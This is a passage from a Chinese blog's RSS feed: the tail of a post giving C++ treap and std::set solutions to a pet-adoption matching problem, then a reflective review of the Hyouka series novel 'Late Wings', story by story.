x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//查询不比x小的且最接近x的数所在位置（x后继）&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(T[k].val&amp;gt;x) ANS=k,&lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Catch&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; num)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//匹配宠物和饲养人&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a,b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;pre&lt;/span&gt;(k,num),a=T[ANS].val; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(k,num), b=T[ANS].val;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(num-a&amp;lt;=b-num &amp;amp;&amp;amp; a != -INF) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans += num-a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(k,a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans += b-num;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(k,b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans %= &lt;span class=&#34;number&#34;&gt;1000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cur;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(k,-INF),&lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(k,INF);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i &amp;lt;= n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a, b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;, &amp;amp;a, &amp;amp;b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(T[k].size == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cur=a;&lt;span class=&#34;comment&#34;&gt;//cur：当前是宠物等人认领还是人在等着接受宠物（看原题，不然谁看得懂啊= =）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(k,b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(a == cur) &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(k,b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;Catch&lt;/span&gt;(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;, ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2.&lt;/span&gt; set实现(&lt;span class=&#34;number&#34;&gt;304&lt;/span&gt;ms,&lt;span class=&#34;number&#34;&gt;2.57&lt;/span&gt;MB)  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;```cpp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cmath&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;ctime&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;set&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; maxn = &lt;span class=&#34;number&#34;&gt;1111111&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; INF = &lt;span class=&#34;number&#34;&gt;1000000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n, ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set &amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    set&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt;::iterator left=--s.&lt;span class=&#34;built_in&#34;&gt;lower_bound&lt;/span&gt;(x),right=s.&lt;span class=&#34;built_in&#34;&gt;lower_bound&lt;/span&gt;(x);&lt;span class=&#34;comment&#34;&gt;//lower_bound的实现是二分查找，迭代器指向不比x小的且最接近x的数的位置，所以left就是前继，right就是后继&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x-*left&amp;lt;=*right-x&amp;amp;&amp;amp;*left!=-INF) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans+=x-*left;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.&lt;span class=&#34;built_in&#34;&gt;erase&lt;/span&gt;(left);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans+=*right-x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.&lt;span class=&#34;built_in&#34;&gt;erase&lt;/span&gt;(right);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ans%=&lt;span class=&#34;number&#34;&gt;1000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cur;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.&lt;span class=&#34;built_in&#34;&gt;insert&lt;/span&gt;(-INF),s.&lt;span class=&#34;built_in&#34;&gt;insert&lt;/span&gt;(INF);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a,b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;, &amp;amp;a, &amp;amp;b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(s.&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;()==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cur=a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            s.&lt;span class=&#34;built_in&#34;&gt;insert&lt;/span&gt;(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(a==cur) s.&lt;span class=&#34;built_in&#34;&gt;insert&lt;/span&gt;(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;, ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/</guid>
            <title>古籍研究社系列第6部《迟来的翅膀》读后感……吗？</title>
            <link>http://cubicy.icu/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/</link>
            <category>冰菓</category>
            <category>古籍研究社</category>
            <pubDate>Thu, 15 Mar 2018 22:58:00 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;准备看之前，我留意到这本书与前几本有些许不同。&lt;br&gt;英文的副标题消失了。封面的配图是天台，是一种生动明晰的色彩吧。天空与天台染上绿色调不知道为什么令我留意了许久。&lt;br&gt;主要还是封底的文字令我很在意：之前几本都只是在此抛出悬念&amp;#x2F;疑问，令读者于书中找到答案，而这里却在后面附上了这样的文字：&lt;br&gt;&lt;strong&gt;“全书分为六个短篇，在充满活力又带点苦涩的故事里，古籍研究社四名成员的过去和未来也逐渐明朗……”&lt;/strong&gt;&lt;br&gt;语气应该很平淡吧，但是仿佛一直在暗示我这一部不简单。这句话在试图传达着什么吗？已经确定了全书的基调吗？&lt;br&gt;&lt;strong&gt;我很好奇。&lt;/strong&gt;  &lt;/p&gt;
&lt;h3 id=&#34;故事1：《箱内的缺失》&#34;&gt;&lt;a href=&#34;#故事1：《箱内的缺失》&#34; class=&#34;headerlink&#34; title=&#34;故事1：《箱内的缺失》&#34;&gt;&lt;/a&gt;故事1：《箱内的缺失》&lt;/h3&gt;&lt;p&gt;案件本身不复杂。投票的票数比人数多，于是里志向折木求助。在2人的散步与对话中，真相逐渐浮出水面。回望同系列第5部《两人距离的概算》，全书用折木于“星谷杯”长跑中的思考串联，此处手法与其颇为相似。&lt;br&gt;&lt;strong&gt;古籍研究社系列的故事往往不在案件本身。&lt;/strong&gt;&lt;br&gt;想想封底的话，不难猜到此处写的是里志的转变。第三部《库特利亚芙卡的顺序》中，里志总是念叨着“数据库是得不出结论的”这样的话。（顺带一提，第三部对四人的形象刻画很生动，个人很喜欢。）然而之所以一直念叨，想必也是因为本人不甘心——尽管那时里志也试着推理，不过他发现自己做不到。而在此，里志明显接受了自己没有折木那样的才能的事实，思想上已经做了转变，他依旧是那个在街机游戏中输了也笑得灿烂的里志。不过里志对公平正义的执着、对自己认为正确的事物的坚持从未改变。若非如此，他便不会为学弟打抱不平，便不会去请求折木解谜。变与不变，把里志形象刻画的极为鲜明。这个故事真正想要表达的是这样吧。 &lt;/p&gt;
&lt;h3 id=&#34;故事2：《镜中不得见》&#34;&gt;&lt;a href=&#34;#故事2：《镜中不得见》&#34; class=&#34;headerlink&#34; title=&#34;故事2：《镜中不得见》&#34;&gt;&lt;/a&gt;故事2：《镜中不得见》&lt;/h3&gt;&lt;p&gt;用摩耶花的视角探寻折木的过去——有意思的视角。早已疑惑摩耶花之前为什么会讨厌折木，本篇则进行了解答，毕竟古籍研究社系列向来是重点在于案件背后。他的初中同学们会讨厌他仅仅是因为一次误会，而折木选择了沉默。在摩耶花的好奇心驱使下，终于了解了折木所作所为的原因。在摩耶花道歉之后，折木看似漫不经心，但是一句“折木的视线游移不定”的描写展现了他内心的深受触动。这一篇故事刻画了折木做好事不留名的“英雄”形象，其实也侧面反映了折木本身并不消极。折木骨子里和里志是一样的，千反田只是唤醒了他的激情。个人认为此文涉及到了校园欺凌，从旁观者的角度出发展现了校园“冷暴力”的可怕。旁观者不应旁观。若直接介入不妥，暗中帮助不失为一种好方法——米泽穗信也许想传达的是这个。&lt;br&gt;不得见的，真的在镜中吗？ &lt;/p&gt;
&lt;h3 id=&#34;故事3：《群山已放晴？》&#34;&gt;&lt;a href=&#34;#故事3：《群山已放晴？》&#34; class=&#34;headerlink&#34; title=&#34;故事3：《群山已放晴？》&#34;&gt;&lt;/a&gt;故事3：《群山已放晴？》&lt;/h3&gt;&lt;p&gt;折木探明了实际上不喜欢直升机的老师在某日早晨说出“我喜欢直升机”的缘由。看到一半的时候其实大部分人便都能模模糊糊猜到缘由了。当然重点依旧不在案件上。&lt;br&gt;&lt;strong&gt;折木说出“我很好奇”&lt;/strong&gt;的时候，无论里志、千反田、摩耶花还是读者都会大吃一惊吧。这则故事不长，像是一种过渡。然而说到过渡就会想到转变——节能主义的折木开始渴望本书中所说的“玫瑰色的人生”。某种程度上，折木已经放弃了节能主义。千反田是引子，根本动力是同里志一样的、内心深处对某些东西的执着和渴望。&lt;br&gt;我相信里志在整个系列中更像是折木的真我之体现。通过两人表现的差异，便能看出折木距离真正的自我还有多远。这是我对里志的理解：折木内心的镜像。&lt;/p&gt;
&lt;h3 id=&#34;故事4：《我们的传说之书》&#34;&gt;&lt;a href=&#34;#故事4：《我们的传说之书》&#34; class=&#34;headerlink&#34; title=&#34;故事4：《我们的传说之书》&#34;&gt;&lt;/a&gt;故事4：《我们的传说之书》&lt;/h3&gt;&lt;p&gt;摩耶花的视角。真相的揭示者就是“凶手”本人，十分有趣。本文探讨了一个问题：&lt;strong&gt;个体在集体之中，应该为了集体的利益而牺牲自己，还是应该为了自己的前途而放弃集体？&lt;/strong&gt;&lt;br&gt;河内学姐自己退出漫研，却安排羽仁担任社长，怎可谓放下？而其劝摩耶花退出也是为了漫研与摩耶花的利益最大化。现实生活往往不会出现故事中漫研完全两极分化的情况。无论做出什么选择，总有人要受伤。因此，我更倾向于遵循自己的本心。摩耶花的选择也许不一定正确，更有可能根本无对错之分，但她至少遵从了自己的本心。  &lt;/p&gt;
&lt;h3 id=&#34;故事5：《悠长的假期》&#34;&gt;&lt;a href=&#34;#故事5：《悠长的假期》&#34; class=&#34;headerlink&#34; title=&#34;故事5：《悠长的假期》&#34;&gt;&lt;/a&gt;故事5：《悠长的假期》&lt;/h3&gt;&lt;p&gt;这则故事详细说明了折木成为节能主义者的原因。故事的结尾借折木的姐姐之口说了这么一句话：&lt;br&gt;&lt;strong&gt;“今后你会迎来悠长的假期，这样也好，你就好好休息吧，没问题，身体休息的时候，内心必须有所改变。”&lt;/strong&gt;&lt;br&gt;这里的“悠长假期”其实是&lt;strong&gt;一语三关&lt;/strong&gt;，既实指折木即将迎来的漫长暑假，也暗指折木之后漫漫无期的节能主义生活，更指的是内心的缓慢改变。“身体休息的时候，内心必须有所改变”，暗喻了折木即将变成一个节能主义者，节能主义生活中内心却并不坚定，终将转变思想。故事最后又加了一句：“也会有人来结束你这悠长的假期。”说明暑假终将过去，节能主义的生活将不再，内心最终也会完成转变，更加成熟。米泽穗信刻意安排折木和千反田二人在这个故事里互动，传达着所谓的“有人”就是千反田，本文是官方发糖的铺垫之一。  &lt;/p&gt;
&lt;h3 id=&#34;故事6：《迟来的翅膀》&#34;&gt;&lt;a href=&#34;#故事6：《迟来的翅膀》&#34; class=&#34;headerlink&#34; title=&#34;故事6：《迟来的翅膀》&#34;&gt;&lt;/a&gt;故事6：《迟来的翅膀》&lt;/h3&gt;&lt;p&gt;不简单的一部书的最后一章，且标题和书的标题相同，暗示着其分量之重。米泽穗信更为用心地去刻画了人物形象。篇幅上稍长，故事的架构和立意更是高明，具备丰富的戏剧性和思想。前面几个故事都是在讲折木、福部和伊原，最后一个自然留给了千反田爱瑠。&lt;br&gt;“案件”的起因是有一天千反田的父亲突然告诉她不一定要再继承家业了。比喻为一道选择题的话，“不必须”就意味着即可用选继承家业，也可以选择不继承，因此在我们看来这实是一道开放的送分题，选择什么都可以，出路变多了，应该开心才对，在旁人看来千反田根本不必这么烦恼，然而在千反田眼中情况却并非如此。因为她不明白该不该用这迟来的翅膀展翅飞翔。&lt;br&gt;不禁想说小说读来总是弥漫着一种淡淡的苦涩（如同封底文字所说），远没有动画来的明快。第一部《冰菓》的I scream已经为整个系列奠定了基调。第一部书中千反田的舅舅关谷纯曾这样跟年幼的千反田解释“冰菓”：&lt;br&gt;&lt;strong&gt;“是要变坚强的意思。如果软弱的话，总有一天会连悲鸣都发不出来。这样的话，就算活着，也只是行尸走肉。”&lt;/strong&gt;&lt;br&gt;作者借舅舅之口说这段话暗指的自然是身为家族继承人的千反田的某种命运，这也是为什么年幼的千反田在听完舅舅的这句话后就哭了。她内心一定是对自己“笼中鸟”的命运做过某种抗争的，但她认为这种抗争无法改变什么，于是就此放弃。然而有一天这件事真的成真了，这个时候千反田才发现自己并没有为此做过任何准备，甚至连这件事本身是不是自己真的想要的也要重新思考，这个时候才真正开始惶恐。&lt;br&gt;折木对这种心理有一个很有趣的比喻：好比有些不信耶稣的人唱赞歌会觉得别扭一样。原本没有自由的千反田能唱出憧憬自由的歌词，但当她真正有了自由后反而唱不出来了，看似矛盾，实则符合人物心境。正如故事的标题《迟来的翅膀》所想传达给我们的意义：笼中的鸟儿会憧憬自由，然而打开鸟笼后，它们却会因&lt;strong&gt;迟来的翅膀&lt;/strong&gt;而恐惧。其实，本书的另一个译名&lt;strong&gt;“事到如今才叫我飞翔”&lt;/strong&gt;更贴近原日文标题的直译，大可以体会一下个中含义。&lt;br&gt;&lt;strong&gt;“这迟来的翅膀，让我不知所措。”&lt;/strong&gt;&lt;br&gt;千反田说出的这句话冲击力巨大。&lt;br&gt;忽然而至的自由，充满未知与可能性的人生，如此之大的冲击，必然动摇了千反田多年来作为千金千反田所存在的意义。即使我们不知道千反田原本愿意被继承人的身份束缚与否，也不知道她是否真的渴望自由，但能确定的是，她面对无限可能性时的迷茫绝不会持久。&lt;br&gt;故事在折木找到千反田后戛然而止，并没有给出答案，也就是说做出什么选择已经不重要了。因为这个命题不是我们每一个人需要思考的：**真正束缚我们的到底是什么？是无形的命运牢笼，还是对改变的恐惧？  **&lt;br&gt;这本书没有后记，再怎么看最后一页都只是冷冰冰的图书在版编目数据，我相信没有后记是因为米泽穗信希望最后这几段对话能久久留存在读者脑海，毕竟这部书相较于前几部很特别。&lt;br&gt;不过令人愉悦的是，此处古籍研究社系列的另一条线渐渐浮出：折木与千反田的关系。千反田引导了折木重新渴望玫瑰色的人生，动摇了折木“节能主义”的信条，成为了结束折木“悠长的假期”的那个人。可以说，折木已经喜欢上了她。既然千反田的迷茫不会持久，因为此次经历，千反田在此之后必然会和折木加深羁绊。请期待吧。 &lt;/p&gt;
&lt;h2 id=&#34;PS……？：&#34;&gt;&lt;a href=&#34;#PS……？：&#34; class=&#34;headerlink&#34; title=&#34;PS……？：&#34;&gt;&lt;/a&gt;PS……？：&lt;/h2&gt;&lt;p&gt;说是校园推理的小说，但实际上许多探讨的事物一点也不校园，更不是为了推理而推理，更多的是对成长、社会、人生价值的思考。与其说是轻小说，我偏向于认为这是纯文学。&lt;br&gt;不管怎么说，我喜欢。&lt;br&gt;希望大家能分享一下关于这本书的感想吧。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;参考&lt;a href=&#34;//www.zhihu.com/question/39576283/answer/82242206&#34;&gt;耳朵读书 | 读《冰菓卷6·迟来的翅膀》有感&lt;/a&gt;&lt;br&gt;奉上很棒的评论：&lt;a href=&#34;//www.zhihu.com/question/21576885/answer/29840285&#34;&gt;如何评价《冰菓》这部动画？-Nasusu的回答&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/</guid>
            <title>洛谷冬令营随想</title>
            <link>http://cubicy.icu/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/</link>
